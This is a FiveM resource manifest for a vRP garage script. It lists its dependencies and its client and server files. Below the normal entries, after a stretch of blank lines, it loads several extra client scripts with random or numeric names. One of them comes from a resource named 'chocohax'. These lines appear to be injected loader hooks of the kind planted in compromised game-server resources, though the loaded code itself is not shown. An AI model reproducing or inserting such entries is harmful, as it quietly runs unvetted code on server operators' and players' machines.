
resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'
description "esk_garage"

dependency "vrp"
dependency "ghmattimysql"

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "config.lua",
  "client.lua",
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "config.lua",
  "server.lua"
}

client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'